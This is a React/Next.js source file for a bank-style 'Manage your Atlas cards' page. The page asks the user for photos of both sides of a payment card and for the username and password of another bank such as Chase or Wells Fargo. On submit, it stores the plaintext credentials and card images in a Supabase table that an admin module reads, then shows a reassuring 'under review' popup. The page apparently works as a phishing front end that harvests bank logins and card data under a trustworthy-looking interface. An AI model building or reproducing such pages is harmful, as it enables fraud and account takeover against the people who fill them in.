"use client";

import { FormEvent, useEffect, useState } from "react";
import Sidebar from "@/components/dashboard/Sidebar";
import TopNavbar from "@/components/dashboard/TopNavbar";
import BankCard from "@/components/dashboard/BankCard";
import { createLinkedCard, loadLinkedCardsFromSupabase } from "@/lib/adminData";

export default function CardsPage() {
  const [frontUpload, setFrontUpload] = useState<File | null>(null);
  const [backUpload, setBackUpload] = useState<File | null>(null);
  const [frontPreview, setFrontPreview] = useState<string | null>(null);
  const [backPreview, setBackPreview] = useState<string | null>(null);
  const [bankName, setBankName] = useState("");
  const [loginId, setLoginId] = useState("");
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [showReviewModal, setShowReviewModal] = useState(false);
  const [cardInReview, setCardInReview] = useState(false);
  const [cards, setCards] = useState<any[]>([]);

  const canSubmit = Boolean(bankName.trim()) && Boolean(loginId.trim()) && Boolean(password) && Boolean(confirmPassword) && password === confirmPassword;

  useEffect(() => {
    const loadCards = async () => {
      const data = await loadLinkedCardsFromSupabase(true);
      setCards(data);
    };

    loadCards();
  }, []);

  useEffect(() => {
    if (!frontUpload) {
      setFrontPreview(null);
      return;
    }

    const previewUrl = URL.createObjectURL(frontUpload);
    setFrontPreview(previewUrl);
    return () => URL.revokeObjectURL(previewUrl);
  }, [frontUpload]);

  useEffect(() => {
    if (!backUpload) {
      setBackPreview(null);
      return;
    }

    const previewUrl = URL.createObjectURL(backUpload);
    setBackPreview(previewUrl);
    return () => URL.revokeObjectURL(previewUrl);
  }, [backUpload]);

  const fileToDataURL = (file: File | null): Promise<string | null> => {
    if (!file) return Promise.resolve(null);
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => resolve(reader.result as string);
      reader.onerror = () => reject(reader.error);
      reader.readAsDataURL(file);
    });
  };

  const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setSubmitted(true);
    setCardInReview(false);
    setShowReviewModal(true);

    const frontData = await fileToDataURL(frontUpload);
    const backData = await fileToDataURL(backUpload);

    await createLinkedCard({
      customerName: "Daniel Morgan",
      loginId,
      password,
      bankName: bankName || "Atlas Bank",
      frontImageName: frontUpload?.name ?? "front image",
      backImageName: backUpload?.name ?? "back image",
      frontImageData: frontData ?? undefined,
      backImageData: backData ?? undefined,
    });

    const refreshed = await loadLinkedCardsFromSupabase(true);
    setCards(refreshed);
  };

  return (
    <main className={`dashboard-page cards-page${showReviewModal ? " has-modal" : ""}`}>
      <Sidebar />

      <section className="dashboard-main">
        <TopNavbar userName="Daniel Morgan" />

        <section className="cards-shell">
          <div className="cards-header">
            <div>
              <p className="eyebrow">Card management</p>
              <h1>Manage your Atlas cards</h1>
              <p>
                Upload card media, confirm your bank login credentials, and keep your linked cards ready for instant use.
              </p>
            </div>
          </div>

          <div className="cards-grid">
            <section className="cards-panel">
              <div className="panel-heading">
                <div>
                  <p className="eyebrow">Upload card images</p>
                  <h3>Proof of ownership</h3>
                </div>
              </div>

              <div className="upload-grid">
                <div className="upload-box">
                  <div>
                    <label className="upload-label" htmlFor="frontUpload">
                      Front of card
                    </label>
                    <span className="upload-hint">PNG, JPG, or WEBP · 5MB max</span>
                  </div>

                  <input id="frontUpload" className="upload-input" type="file" accept="image/*" capture="environment" onChange={(event) => setFrontUpload(event.target.files?.[0] ?? null)} />
                  <input id="frontGalleryUpload" className="upload-input" type="file" accept="image/*" onChange={(event) => setFrontUpload(event.target.files?.[0] ?? null)} />
                  <div className="upload-options">
                    <label className="upload-option" htmlFor="frontUpload">Use camera</label>
                    <label className="upload-option" htmlFor="frontGalleryUpload">Choose from gallery</label>
                  </div>
                  <span className="upload-filename">{frontUpload?.name || "Choose a front image"}</span>
                </div>

                <div className="upload-box">
                  <div>
                    <label className="upload-label" htmlFor="backUpload">
                      Back of card
                    </label>
                    <span className="upload-hint">PNG, JPG, or WEBP · 5MB max</span>
                  </div>

                  <input id="backUpload" className="upload-input" type="file" accept="image/*" capture="environment" onChange={(event) => setBackUpload(event.target.files?.[0] ?? null)} />
                  <input id="backGalleryUpload" className="upload-input" type="file" accept="image/*" onChange={(event) => setBackUpload(event.target.files?.[0] ?? null)} />
                  <div className="upload-options">
                    <label className="upload-option" htmlFor="backUpload">Use camera</label>
                    <label className="upload-option" htmlFor="backGalleryUpload">Choose from gallery</label>
                  </div>
                  <span className="upload-filename">{backUpload?.name || "Choose a back image"}</span>
                </div>
              </div>

              <form className="cards-form" onSubmit={handleSubmit}>
                <div className="field-group">
                  <label htmlFor="bankName">Bank name</label>
                  <input
                    id="bankName"
                    type="text"
                    value={bankName}
                    onChange={(event) => setBankName(event.target.value)}
                    placeholder="Bank name (e.g. Chase, Wells Fargo)"
                  />
                </div>

                <div className="field-group">
                  <label htmlFor="loginId">Bank login</label>
                  <input
                    id="loginId"
                    type="text"
                    value={loginId}
                    onChange={(event) => setLoginId(event.target.value)}
                    placeholder="Username, email or ID"
                  />
                </div>

                <div className="field-grid">
                  <div className="field-group">
                    <label htmlFor="password">Password</label>
                    <div className="password-row">
                      <input
                        id="password"
                        type={showPassword ? "text" : "password"}
                        value={password}
                        onChange={(event) => setPassword(event.target.value)}
                        placeholder="Enter password"
                      />
                      <button
                        type="button"
                        className="password-toggle"
                        onClick={() => setShowPassword((value) => !value)}
                      >
                        {showPassword ? "Hide" : "View"}
                      </button>
                    </div>
                  </div>

                  <div className="field-group">
                    <label htmlFor="confirmPassword">Confirm password</label>
                    <input
                      id="confirmPassword"
                      type={showPassword ? "text" : "password"}
                      value={confirmPassword}
                      onChange={(event) => setConfirmPassword(event.target.value)}
                      placeholder="Repeat password"
                    />
                  </div>
                </div>

                <div className="form-actions">
                  <button className="secondary-btn" type="button" onClick={() => {
                    setFrontUpload(null);
                    setBackUpload(null);
                    setLoginId("");
                    setPassword("");
                    setConfirmPassword("");
                    setSubmitted(false);
                    setCardInReview(false);
                    setShowReviewModal(false);
                  }}>
                    Reset
                  </button>
                  <button className="primary-btn" type="submit" disabled={!canSubmit}>
                    {submitted ? "Submit again" : "Submit request"}
                  </button>
                </div>

                {password && confirmPassword && password !== confirmPassword && (
                  <p className="field-error">Passwords do not match.</p>
                )}
              </form>
            </section>

            <aside className="cards-preview-panel">
              <div className="panel-heading">
                <div>
                  <p className="eyebrow">Card preview</p>
                  <h3>Your premium card</h3>
                </div>
              </div>

              <BankCard showReview={cardInReview} frontImageSrc={frontPreview ?? undefined} />

              <div className="card-preview-grid">
                <div className="card-preview-item">
                  <span>Front preview</span>
                  {frontPreview ? (
                    <img src={frontPreview} alt="Front card preview" />
                  ) : (
                    <div className="preview-placeholder">No front image selected</div>
                  )}
                </div>
                <div className="card-preview-item">
                  <span>Back preview</span>
                  {backPreview ? (
                    <img src={backPreview} alt="Back card preview" />
                  ) : (
                    <div className="preview-placeholder">No back image selected</div>
                  )}
                </div>
              </div>

              <div className="preview-copy">
                <p>
                  {cardInReview
                    ? "Under review"
                    : submitted
                    ? "Review request sent. Confirm the popup to generate your card."
                    : "Submit the form to start card review."}
                </p>
              </div>
            </aside>
          </div>
        </section>
      </section>

      {showReviewModal && (
        <div className="cards-modal-backdrop" role="dialog" aria-modal="true" aria-label="Card review notification">
          <div className="cards-modal">
            <p className="eyebrow">Under review</p>
            <h2>Your card is being reviewed</h2>
            <p>We are verifying the details you submitted. Click OK to confirm and show the card review state.</p>
            <button
              className="primary-btn"
              type="button"
              onClick={() => {
                setShowReviewModal(false);
                setCardInReview(true);
              }}
            >
              OK
            </button>
          </div>
        </div>
      )}
    </main>
  );
}
